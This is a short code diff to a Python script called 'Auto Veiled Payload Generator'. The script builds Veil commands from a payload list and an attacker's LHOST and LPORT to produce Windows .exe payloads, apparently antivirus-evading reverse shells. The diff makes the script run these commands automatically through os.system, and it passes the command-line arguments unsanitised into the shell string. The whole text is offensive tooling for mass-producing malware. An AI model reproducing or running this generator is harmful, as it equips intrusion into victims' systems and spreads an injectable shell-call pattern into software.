@@ -42,7 +42,7 @@ payload_list={
 def CreatePayloadCommand(payload_tuple,LHOST,LPORT,path):
     file_name=payload_tuple[0].split("/")
     file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]+".exe"
-    print "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
+    return "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
     
 parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
 parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
@@ -62,5 +62,5 @@ if not os.path.exists(path):
     os.makedirs(path)
 
 for payload in payload_list:
-    CreatePayloadCommand(payload, args.LHOST, args.LPORT, path)
+    os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT, path))
     
